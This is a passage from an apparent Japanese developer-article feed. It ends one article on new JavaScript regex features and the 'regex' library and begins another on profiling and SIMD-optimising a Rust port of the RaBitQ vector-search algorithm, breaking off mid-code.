<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{</span>regex<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'regex'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> ipv4 <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\b
  (?&lt;byte> 25[0-5] | 2[0-4]\d | 1\d\d | [1-9]?\d)
  # Match the remaining 3 dot-separated bytes
  (\. \g&lt;byte>){3}
\b</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>さらに、サブルーチン定義グループを通じて参照のみで使用するサブパターンを定義することができます。こちらは先ほど見た名前付きキャプチャの項目の正規表現の改善例です。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> record <span class="token operator">=</span> <span class="token string">'Admitted: 2024-01-01\nReleased: 2024-01-03'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> re <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  ^ Admitted:\ (?&lt;admitted> \g&lt;date>) \n
    Released:\ (?&lt;released> \g&lt;date>) $

  (?(DEFINE)
    (?&lt;date>  \g&lt;year>-\g&lt;month>-\g&lt;day>)
    (?&lt;year>  \d{4})
    (?&lt;month> \d{2})
    (?&lt;day>   \d{2})
  )
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> match <span class="token operator">=</span> record<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* → {
  admitted: '2024-01-01',
  released: '2024-01-03'
} */</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>モダンな正規表現のベースライン <a href="#モダンな正規表現のベースライン">#</a><a name="モダンな正規表現のベースライン"></a></h2>
<p><code class="language-text">regex</code>にはデフォルトで<code class="language-text">v</code>フラグが含まれているため、有効化し忘れることがありません。また、ネイティブの<code class="language-text">v</code>フラグをサポートしていない環境では、自動的に<code class="language-text">u</code>フラグに切り替わりつつも、<code class="language-text">v</code>フラグのエスケープ規則を適用し、正規表現の前方互換性と後方互換性を確保します。</p>
<p>また、エミュレートされた<code class="language-text">x</code>（ちょっとした空白とコメント）および<code class="language-text">n</code>（「名前付きキャプチャのみ」モード）フラグをデフォルトで暗黙的に有効化するため、毎回これらの上位モードを選択する必要がありません。さらに、タグ付きテンプレートリテラルであるため、<code class="language-text">RegExp</code>コンストラクタの場合のようにバックスラッシュ<code class="language-text">\\\\</code>をエスケープ処理する必要がありません。</p>
<h2>アトミックグループと絶対最大量指定子で破壊的なバックトラックを回避できる <a href="#アトミックグループと絶対最大量指定子で破壊的なバックトラックを回避できる">#</a><a name="アトミックグループと絶対最大量指定子で破壊的なバックトラックを回避できる"></a></h2>
<p>アトミックグループと絶対最大量指定子も、<code class="language-text">regex</code>ライブラリで追加された強力な機能です。これらは主にパフォーマンスと破壊的なバックトラック（ReDoSとも呼ばれ、特定の正規表現が特定の、あまり一致しない文字列を検索する際に膨大な時間がかかる深刻な問題）に対するレジリエンスに関する機能ですが、より単純なパターンを書けるようにすることで可読性も改善します。</p>
<p><strong>注</strong>：詳しくは<code class="language-text">regex</code>の<a href="https://github.com/slevithan/regex#atomic-groups">ドキュメント</a>をご覧ください。</p>
<h2>今後実装されそうなJavaScript正規表現の改良 <a href="#今後実装されそうなJavaScript正規表現の改良">#</a><a name="今後実装されそうなJavaScript正規表現の改良"></a></h2>
<p>JavaScriptの正規表現を改良するための様々な提案が現在検討されています。JavaScriptの将来バージョンに組み込まれる見込みの高い3つの提案について以下にご紹介します。</p>
<h2>重複する名前付きキャプチャグループ <a href="#重複する名前付きキャプチャグループ">#</a><a name="重複する名前付きキャプチャグループ"></a></h2>
<p>これはステージ3（最終化間近）の<a href="https://github.com/tc39/proposal-duplicate-named-capturing-groups">改良案</a>です。さらに良いことに、直近の情報によるとこの改良はすべての主要ブラウザで機能します。</p>
<p>名前付きキャプチャが最初に導入された際、すべての<code class="language-text">(?&lt;name>...)</code>キャプチャで一意の名前を使用することが求められました。しかし、正規表現には複数の代替パスがある場合もあり、それぞれのパスで同じグループ名を使用した方がコードを単純化できます。</p>
<p>以下の例をご覧ください。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;year>\d{4})-\d\d|\d\d-(?&lt;year>\d{4})</span><span class="token regex-delimiter">/</span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>この改良案は、まさにこの例の構文を可能にするもので、このような構文で「重複するキャプチャグループ名」エラーが発生するのを防ぎます。ただし、各代替パスの中では引き続き一意の名前を使用する必要があります。</p>
<h2>パターン修飾子（別名：フラググループ） <a href="#パターン修飾子（別名：フラググループ）">#</a><a name="パターン修飾子（別名：フラググループ）"></a></h2>
<p>こちらもステージ3の<a href="https://github.com/tc39/proposal-regexp-modifiers">改良案</a>です。Chrome/Edge 125およびOpera 111ではすでにサポートされており、<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1899813">近々</a>Firefoxでもサポートされる予定です。Safariについては<a href="https://bugs.webkit.org/show_bug.cgi?id=275672">今のところ</a>不明です。</p>
<p>パターン修飾子は<code class="language-text">(?ims:...)</code>、<code class="language-text">(?-ims:...)</code>、<code class="language-text">(?im-s:...)</code>のいずれかを使用し、正規表現の特定の部分のみについて<code class="language-text">i</code>、<code class="language-text">m</code>、<code class="language-text">s</code>フラグのオンとオフを切り替えます。</p>
<p>以下の例をご覧ください。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">hello-(?i:world)</span><span class="token regex-delimiter">/</span></span>
<span class="token comment">// Matches 'hello-WORLD' but not 'HELLO-WORLD'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2><code class="language-text">RegExp.escape</code>による正規表現の特殊文字のエスケープ処理 <a href="#RegExp.escapeによる正規表現の特殊文字のエスケープ処理">#</a><a name="RegExp.escapeによる正規表現の特殊文字のエスケープ処理"></a></h2>
<p>この<a href="https://github.com/tc39/proposal-regex-escaping">改良案</a>は、長い時間を経てようやく最近ステージ3に到達しました。まだどの主要ブラウザも対応していません。謳い文句どおり<code class="language-text">RegExp.escape(str)</code>関数を提供することで、正規表現の特殊文字がすべてエスケープ処理された状態で文字列を返し、リテラル文字列としてマッチングすることを可能にします。</p>
<p>この機能がすぐに必要な場合、<a href="https://github.com/sindresorhus/escape-string-regexp">escape-string-regexp</a>が最も広く使われているパッケージです（毎月5億回以上ダウンロードされています）。このnpmパッケージは、最低限のエスケープ処理を行う超軽量の専用ユーティリティです。ほとんどのケースではこれで十分ですが、エスケープ処理を行った文字列が正規表現内のどの位置でも安全に使用できることを確認する必要がある場合、<code class="language-text">escape-string-regexp</code>はこの記事ですでに紹介した<code class="language-text">regex</code>ライブラリを推奨しています。<code class="language-text">regex</code>ライブラリは、埋め込み文字列のエスケープ処理を補間により、<a href="https://github.com/slevithan/regex#interpolating-escaped-strings">コンテクストを意識した方法</a>で行います。</p>
<h2>まとめ <a href="#まとめ">#</a><a name="まとめ"></a></h2>
<p>この記事では、JavaScriptの正規表現の過去、現在、そして未来についてお話しました。</p>
<p>正規表現についてさらに詳しく学びたい方は、<a href="https://github.com/slevithan/awesome-regex">Awesome Regex</a>に優れた正規表現テスター、チュートリアル、ライブラリ、その他のリソースが紹介されているのでぜひご覧ください。正規表現のクロスワードパズルに挑戦してみたい方は、<a href="https://regexle.com/">regexle</a>をお試しください。</p>
<p>皆さんの実りある構文解析と正規表現の可読性向上の一助になれば幸いです。</p>]]></content:encoded></item><item><title><![CDATA[アルゴリズムのパフォーマンスを段階的に改善する]]></title><description><![CDATA[最近、筆者はRaBitQという新しい近似最近傍探索アルゴリズムを使ったさまざまな試みを行っています。このアルゴリズムを提案した論文の著者はすでにC++実装を提供しており、実行速度はかなり速いです。筆…]]></description><link>https://postd.cc/rabitq-bench/</link><guid isPermaLink="false">https://postd.cc/rabitq-bench/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[パフォーマンス]]></category><category><![CDATA[アルゴリズム]]></category><category><![CDATA[Rust]]></category><pubDate>Thu, 28 Nov 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>最近、筆者は<a href="https://arxiv.org/abs/2405.12497">RaBitQ</a>という新しい近似最近傍探索アルゴリズムを使ったさまざまな試みを行っています。このアルゴリズムを提案した論文の著者はすでに<a href="https://github.com/gaoj0017/RaBitQ">C++実装</a>を提供しており、実行速度はかなり速いです。筆者はこれを<a href="https://github.com/kemingy/rabitq">Rustに書き換えようとしました</a>（いわゆるRiiR（Rewrite it in Rust）です）が、実装結果は元のアルゴリズムよりも大幅に遅いことが判明しました。この記事では、アルゴリズムのパフォーマンスを段階的に改善する方法をご紹介します。</p>
<h2>環境の準備</h2>
<h3>データセット</h3>
<p>最も重要なのは、適当なデータセットをいくつか用意することです。前述の論文では、<code class="language-text">sift_dim128_1m_l2</code>と<code class="language-text">gist_dim960_1m_l2</code>という2つのデータセットについての結果が示されています。このデータセットでは、128項目と960項目というのがよく使われるサイズであり、1,000,000個のデータポイント（ベクトル）があれば性能を測るのに十分だということです。つまり、これらのデータセットを使うことで、アルゴリズムの性能をしっかりと評価できるということです。データセットは<a href="http://corpus-texmex.irisa.fr/">こちら</a>からダウンロードできます。（こちらのサイトはTLSに対応しておらず、FTPダウンロードしか提供していません。）</p>
<p>これらのデータセットは、一般的なベクトル形式である<code class="language-text">fvecs/ivecs</code>を使用しています。</p>
<div class="gatsby-highlight" data-language="python"><pre style="counter-reset: linenumber NaN" class="language-python line-numbers"><code class="language-python"><span class="token operator">|</span> dim <span class="token punctuation">(</span><span class="token number">4</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span> vector <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> dim <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">|</span> dim <span class="token punctuation">(</span><span class="token number">4</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span> vector <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> dim <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">|</span> dim <span class="token punctuation">(</span><span class="token number">4</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span> vector <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> dim <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">|</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>読み取り／書き込み用のスクリプトは筆者の<a href="https://gist.github.com/kemingy/2f503fcfff86b9e0197e975c02359157">Gist</a>から取得できます。</p>
<h3>プロファイリングツール</h3>
<p>Rustコードのプロファイリングには<a href="https://blog.mapotofu.org/blogs/rabitq-bench/#:~:text=I%20use-,samply,-to%20profile%20the">samply</a>を使用しています。このツールは<a href="https://profiler.firefox.com/">Firefox Profiler</a>に追加して使用できます。プロファイリングの結果は、クラウドにアップロードすることで他者と共有することもできます。こちらは<a href="https://share.firefox.dev/3Y4Hppz">Gistで公開されているC++版のプロファイリング例</a>です。ビューはFlameGraphとCallTreeが最も一般的です。パフォーマンスイベント権限を付与し、mlockの上限を増やす必要があります。</p>
<div class="gatsby-highlight" data-language="bash"><pre style="counter-reset: linenumber NaN" class="language-bash line-numbers"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'1'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/perf_event_paranoid
<span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token assign-left variable">kernel.perf_event_mlock_kb</span><span class="token operator">=</span><span class="token number">2048</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p><a href="https://godbolt.org/">GodBolt</a>のCompiler Explorerも、C++とRustの関数のアセンブリコードを比較するのに役立ちます。</p>
<h3>Cargoプロファイル</h3>
<p>リリースビルドにデバッグ情報を含めるには、<code class="language-text">Cargo.toml</code>に新たなプロファイルを追加します。</p>
<div class="gatsby-highlight" data-language="toml"><pre style="counter-reset: linenumber NaN" class="language-toml line-numbers"><code class="language-toml"><span class="token punctuation">[</span><span class="token table class-name">profile.perf</span><span class="token punctuation">]</span>
<span class="token key property">inherits</span> <span class="token punctuation">=</span> <span class="token string">"release"</span>
<span class="token key property">debug</span> <span class="token punctuation">=</span> <span class="token boolean">true</span>
<span class="token key property">codegen-units</span> <span class="token punctuation">=</span> <span class="token number">16</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>コンパイルコストとランタイム速度は、プロファイリングにおけるユーザーエクスペリエンスを大きく左右します。</p>
<ul>
<li><code class="language-text">cargo build</code>はコンパイル速度は速いものの、Pythonよりもコードの実行速度は遅い場合がある</li>
<li><code class="language-text">cargo build --release</code>は、コードの実行速度は速いものの、コンパイルには時間がかかる場合がある
ベンチマーキングには<code class="language-text">opt-level = 3</code>を使用することを推奨します。
以下の設定の使用が推奨されているのを目にしましたが、筆者の場合はコンパイル速度が遅くなり、パフォーマンスの改善は全く見られませんでした。</li>
</ul>
<div class="gatsby-highlight" data-language="toml"><pre style="counter-reset: linenumber NaN" class="language-toml line-numbers"><code class="language-toml"><span class="token key property">codegen-units</span> <span class="token punctuation">=</span> <span class="token number">1</span>
<span class="token key property">lto</span> <span class="token punctuation">=</span> <span class="token string">"fat"</span>
<span class="token key property">panic</span> <span class="token punctuation">=</span> <span class="token string">"abort"</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<h3>ベンチマークツール</h3>
<p><a href="https://github.com/bheisler/criterion.rs">Criterion</a>は、統計に基づく優れたベンチマークツールです。関連するベンチマークコードをすべて格納するために、新たな<a href="https://github.com/kemingy/rs_bench">リポジトリ</a>を作成しました。ベンチマークコードは同じリポジトリに入れる必要があるようです。</p>
<p>注目すべき点として、ベンチマークの結果はあまり安定していません。筆者の場合はコードに手を加えていない状態で<code class="language-text">±10%</code>の差異が見られました。ノートパソコンを使用している場合、高温によりCPUがアンダークロックし、さらに差異が広がる可能性があります。</p>
<p>関数のベンチマークには、いくつかの異なるパラメータを使用することをおすすめします。この場合、筆者は異なる項目のベクトルを使用します。すべての項目の結果がプラスであれば、通常は改善が効果的であることを意味します。</p>
<h3>指標</h3>
<p>最初からいくつかの指標を追加しましょう。指標をチェックすることで、多くのバグやパフォーマンスの問題を見つけることができます。筆者は、現行の要件が単純であるため直接<code class="language-text">AtomicU64</code>を使用していますが、後で<a href="https://github.com/prometheus/client_rust">Prometheusを使った指標</a>に移行するかもしれません。
指標／ロギング／トレースが多すぎるとパフォーマンスに影響が出る可能性があるため、これらを追加する際には注意してください。</p>
<h3>リソース</h3>
<p>ベンチマークの際に、筆者はエンドツーエンドのQPSが極めて不安定であることに気がつきました。コードを再コンパイルしていなくても、翌朝にはベンチマークの結果に<strong>15</strong>%の改善または悪化が見られる場合もあります。また、筆者はVSCodeの拡張機能「rust-analyzer」を使用しているため、CPUが完全にアイドル状態ではなく、CPUの使用率は低いもののベンチマークの結果に大きな影響を及ぼすことが分かりました。ちなみに、筆者は8つの高性能コアと8つの高効率コアで構成された<a href="https://www.intel.com/content/www/us/en/products/sku/230500/intel-core-i713700k-processor-30m-cache-up-to-5-40-ghz/specifications.html">Intel Core i7-13700K</a>を使用しており、プログラムはシングルスレッドです。</p>
<p>筆者は<code class="language-text">taskset</code>を使用してプロセスを実行するCPUを指定しています。そうすることで、種類の異なるコアのスケジューリングの影響を受けることはありません。</p>
<p>第13〜14世代のIntel Core CPUは電圧が非常に高いため不安定です。筆者はこの問題をBIOSで修正しました。</p>
<p>クラウドの仮想マシンはCPU温度の影響を受けないかもしれませんが、クラウドプロバイダーにはCPUのスロットリングやオーバーコミットに関する独自のポリシーがある場合があります。</p>
<h2>段階的な改善</h2>
<h3>単純な実装から始める</h3>
<p>筆者の<a href="https://github.com/kemingy/rabitq/tree/dbfd54bd5d739b0729dc28e6fbd8d5413b019561">最初のリリース</a>は、<a href="https://docs.rs/nalgebra">nalgebra</a>という代数ライブラリをベースにRaBitQアルゴリズムを実装しました。主な理由は、RaBitQアルゴリズムにおいて重要なステップである直交行列を取得するためにQR分解を使う必要があるからです。また、成熟した線形代数ライブラリは行列やベクトルを操作するのに役立つ関数を多く提供するため、アルゴリズムを実装しやすいという利点もあります。Pythonで<code class="language-text">numpy</code>を使わずに行列の乗算、射影、分解に関するアルゴリズムを実装することを考えてみてください。まさに悪夢です。</p>
<p><code class="language-text">nalgebra</code>はこのようなシナリオ向けに最適化されているため、パフォーマンスは良いはずだと考えました。しかし、ベンチマークは筆者の予想よりもかなり遅い結果となりました。<code class="language-text">numpy</code>で再実装した方がはるかに速いでしょう:(</p>
<p><a href="https://share.firefox.dev/3AwiVNR">プロファイリング</a>によると、<code class="language-text">f32::clone()</code>の呼び出しが多数あります。全体の時間の約33%を占めており、<code class="language-text">query_one</code>関数に注目すると44%となります。この結果から、一部のベクトルについてメモリを事前に割り当て、同じイテレーション内で再利用するという非常に一般的な裏技が使えることが分かります。したがって、<code class="language-text">(x - y).norm_squared()</code>を使う代わりに、<code class="language-text">(x - y)</code>の結果を格納する別のベクトルをあらかじめ宣言する必要があり、結果的に<code class="language-text">x.sub_to(y, &amp;mut z); z.norm_squared()</code>となります。<a href="https://github.com/kemingy/rabitq/commit/23f9aff4c8b3303c0a03ac9a7472ada8cc915a3b">コミット23f9aff</a>をご覧ください。</p>
<p>ほとんどの代数ライブラリと同様に、このベクトルは列優先で行列を格納するため、行よりも列に対して処理を順番に繰り返し実行した方が速いことを意味します。イテレーションの前に行列を転置しなくてはならないのは少し面倒であり、ベクトルと行列の乗算がすべてコンパイル時に項目のミスマッチエラー（<code class="language-text">1 x dyn</code>または<code class="language-text">dyn x 1</code>）を検出できるとは限りません。</p>
<h3>CPUターゲット</h3>
<p>RaBitQは、バイナリの内積距離を用いておおよその距離を推定します。距離は以下により計算します。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">binary_dot_product</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u64</span><span class="token punctuation">]</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u64</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">u32</span> <span class="token punctuation">{</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>x<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res <span class="token operator">+=</span> <span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count_ones</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    res
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ここでは、<code class="language-text">u64::count_ones()</code>は組み込み関数であるため、通常は特別な設定なしで使用できると考えましたが、実際にはコンパイル時にpopcnt機能を有効化する必要があります。<code class="language-text">RUSTFLAGS="-C target-feature=+popcnt"</code>を使うことで有効化できますが、筆者は<code class="language-text">RUSTFLAGS="-C target-cpu=native"</code>を好みます。後者は現在のCPUが対応するすべてのCPU機能を有効化しますが、バイナリ互換性が失われます。現時点では、特定の環境でのみ使用するため問題ではないと考えています。以下のセクションでも、AVX2機能を有効化するためにこの環境変数が必要になります。</p>
<p>CPUの機能は以下のコマンドを使用することで確認できます。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust">rustc <span class="token operator">-</span><span class="token operator">-</span>print<span class="token operator">=</span>cfg <span class="token operator">-</span><span class="token class-name">C</span> target<span class="token operator">-</span>cpu<span class="token operator">=</span>native <span class="token operator">|</span> rg target_feature</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<h3>SIMD</h3>
<p>最近傍探索において重要な関数は距離関数であり、この場合はユークリッド距離です。通常は、平方根の計算を避けるためにL2二乗距離を使用します。単純な実装は以下のようになります。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token punctuation">{</span>
    y<span class="token punctuation">.</span><span class="token function">sub_to</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> residual<span class="token punctuation">)</span><span class="token punctuation">;</span>
    residual<span class="token punctuation">.</span><span class="token function">norm_squared</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>プロファイリングの後、<code class="language-text">f32::clone()</code>がまだ残っていることに気づきました。<code class="language-text">nalgebra</code>のソースコードを確認してみると、何らかの理由により多数の<code class="language-text">clone</code>がありました。そこで、SIMDを手書きすることにしました。幸い、<a href="https://github.com/nmslib/hnswlib">hnswlib</a>（人気のHNSW実装）がすでに<a href="https://github.com/nmslib/hnswlib/blob/master/hnswlib/space_l2.h">これ</a>を実装しています。</p>
<p>これにより、距離の計算において<code class="language-text">f32::clone()</code>がなくなり、SIFTでQPSが<strong>28</strong>%改善します。<a href="https://github.com/kemingy/rabitq/commit/5f82fccf8b39964ef1f66e9927fb126fd6886765">コミット5f82fcc</a>をご覧ください。</p>
<p>筆者のCPUはAVX512に対応していないため、AVX2バージョンを使用しています。<a href="https://store.steampowered.com/hwsurvey/">Steamでハードウェアの統計データ</a>を確認できますが、「<em>Other Settings</em>」にSIMDのサポートが記載されています。<em>100</em>%のユーザーがSSE3に対応し、<em>94.61</em>%のユーザーがAVX2に対応していますが、AVX512Fに対応しているユーザーは<em>13.06</em>%に過ぎません。当然この統計データは偏っており、ほとんどのクラウドIntel CPUはAVX512に対応しています。ゲームプレイヤーがすべてのユーザーを代表することはできません。</p>
<p>SIMDを使用する上で非常に役立つガイドとして<a href="https://www.intel.com/content/www/us/en/docs/intrinsics-guide/index.html#">Intel Intrinsics Guide</a>が挙げられます。オンラインだと使い勝手が良くないため、サイトをダウンロードすることをおすすめします。組み込み関数の「<strong>レイテンシ</strong>」と「<strong>スループット</strong>」は必ず確認してください。そうしないと、通常のバージョンよりもコードが遅くなる場合があります。</p>
<p><a href="https://db.in.tum.de/~finis/x86%20intrinsics%20cheat%20sheet%20v1.0.pdf">x86 Intrinsics Cheat Sheet</a>というリソースもあります。こちらは筆者のような初心者が使いやすい内容になっています。</p>
<p><a href="https://github.com/ashvardanian">@ashvardanian</a>が、テール要素問題を解決する「マスクロード」（AVX512が必要）に関する記事を<a href="https://ashvardanian.com/posts/simsimd-faster-scipy/#tails-of-the-past-the-significance-of-masked-loads">投稿</a>しています。</p>
<p>コードを他のプラットフォームでも実行できるようにするには、以下を行います。
<code class="language-text">rust
#[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
{
    if is_x86_feature_detected!("avx2") {
        // AVX2 version
    } else {
        // normal version
    }
}
</code></p>
<p>SIMD向けにより良いcfgを書くのに役立つクレートがいくつかありますが、今のところは複雑にせず、シンプルにしておきましょう。</p>
<h3>SIMDに関する補足</h3>
<p>SIMDは金槌のようなものなので、今度はコードの中の「釘」をもっと見つける必要があります。</p>
<p><a href="https://github.com/kemingy/rabitq/commit/f114fc1ec58686596ade0df02a96fcf04b0bf828">コミットf114fc1</a>でAVX2を使用して<code class="language-text">binarize_vector</code>関数を書き換えたところ、GistのQPSが<strong>32</strong>%改善した</p>
<p><del>元のC++版に比べて、この実装も分岐がありません</del>。<code class="language-text">opt-level=3</code>を有効化すると、コンパイラによってこれを最適化することができます。<a href="https://godbolt.org/z/hjP5qjabz">アセンブリ</a>をご覧ください。</p>
<div class="gatsby-highlight" data-language="diff"><pre style="counter-reset: linenumber NaN" class="language-diff line-numbers"><code class="language-diff">@andrewaylett pointed out that opt-level=3 can optimize this</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><em>opt-level=3でこれを最適化できると@andrewaylettが指摘</em></p>
<div class="gatsby-highlight" data-language="diff"><pre style="counter-reset: linenumber NaN" class="language-diff line-numbers"><code class="language-diff"><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span> let shift = if (i / 32) % 2 == 0 { 32 } else { 0 };
</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span> let shift = ((i >> 5) &amp; 1) &lt;&lt; 5;  // opposite version because I store the binary in u64 with different endian from the C++ version</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>-<em>let shift = if (i / 32) % 2 == 0 { 32 } else { 0 };</em></p>
<p>+<em>let shift = ((i >> 5) &#x26; 1) &#x3C;&#x3C; 5;  // C++版とは異なるエンディアンを使用してバイナリをu64に格納するため、逆バージョン</em></p>
<div class="gatsby-highlight" data-language="diff"><pre style="counter-reset: linenumber NaN" class="language-diff line-numbers"><code class="language-diff">@NovaX first pointed out that it's equivalent to i &amp; 32, which is more readable.</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><em>より可読性に優れたi &#x26; 32と同等であると、@NovaXが最初に指摘</em></p>
<h3>スカラー量子化</h3>
<p>コード内の<code class="language-text">f32::clone()</code>を減らすため、筆者はもっと多くの<code class="language-text">nalgebra</code>関数を手動で実装することにしました。<code class="language-text">min</code>および<code class="language-text">max</code>関数が最も一般的なものです。<code class="language-text">nalgebra</code>バージョンは以下のようになります。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token keyword">let</span> lower_bound <span class="token operator">=</span> residual<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> upper_bound <span class="token operator">=</span> residual<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p>これは以下により行います。</p>
<div class="gatsby-highlight" data-language="rust"><pre style="counter-reset: linenumber NaN" class="language-rust line-numbers"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">min_max</span><span class="token punctuation">(</span>vec<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">f32</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">f32</span><span class="token punctuation">,</span> <span class="token keyword">f32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> min <span class="token operator">=</span> <span class="token keyword">f32</span><span class="token punctuation">::</span><span class="token constant">MAX</span><span class="token punctuation">;</span>
